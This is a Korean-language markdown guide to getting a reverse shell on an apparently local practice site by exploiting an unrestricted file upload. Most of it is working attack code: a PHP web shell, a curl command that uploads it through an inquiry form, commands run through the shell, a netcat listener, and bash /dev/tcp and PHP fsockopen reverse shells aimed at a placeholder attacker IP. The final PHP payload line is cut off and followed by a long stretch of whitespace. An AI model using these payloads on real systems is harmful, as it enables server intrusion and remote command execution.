# 🐚 리버스쉘 획득 가이드

## 🎯 공격 벡터 분석

현재 website2는 **3가지 치명적 취약점**이 결합되어 있습니다:

### ✅ 확인된 취약점
1. **Unrestricted File Upload** - 파일 타입 검증 없음 ([submit_inquiry.php:70-106](api/submit_inquiry.php#L70-L106))
2. **Directory Traversal 가능** - uploads 디렉토리 777 권한
3. **HTTP Request Smuggling** - Nginx → Apache 파싱 불일치

### ✅ 시스템 환경
- **OS**: Debian 13.1 (Trixie)
- **쉘**: `/usr/bin/bash`, `/usr/bin/sh` 사용 가능
- **PHP**: `/usr/local/bin/php` 설치됨
- **업로드 경로**: `/var/www/html/uploads/` (777 권한)
- **웹 접근**: `http://localhost:9000/uploads/[filename]`

---

## 🚀 방법 1: PHP 웹쉘 업로드 (가장 간단)

### Step 1: PHP 웹쉘 작성

**shell.php**:
```php
<?php
// Simple Web Shell
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

### Step 2: 일반 업로드 (Smuggling 없이)

```bash
# 웹쉘 파일 생성
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# curl로 업로드
curl -X POST http://localhost:9000/api/submit_inquiry.php \
  -F "name=test" \
  -F "email=test@test.com" \
  -F "phone=010-1234-5678" \
  -F "category=technical" \
  -F "subject=test" \
  -F "message=test" \
  -F "image=@shell.php"
```

**응답 예시**:
```json
{
  "success": true,
  "message": "문의가 성공적으로 접수되었습니다.",
  "inquiry_id": 5,
  "image_path": "uploads/shell.php"
}
```

### Step 3: 웹쉘 접근

```bash
# 명령 실행
curl "http://localhost:9000/uploads/shell.php?cmd=whoami"
# 출력: www-data

curl "http://localhost:9000/uploads/shell.php?cmd=id"
# 출력: uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl "http://localhost:9000/uploads/shell.php?cmd=ls+-la+/var/www/html"
```

### Step 4: 리버스쉘 실행

**공격자 머신에서**:
```bash
# Listener 시작
nc -lvnp 4444
```

**웹쉘을 통해 리버스쉘 실행**:
```bash
# Bash 리버스쉘
curl "http://localhost:9000/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'"

# 또는 PHP 리버스쉘
curl "http://localhost:9000/uploads/shell.php?cmd=php+-r+'\$sock=fsockopen(\"YOUR_IP\",4444)%3Bexec(\"/bin/bash+-i+<%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    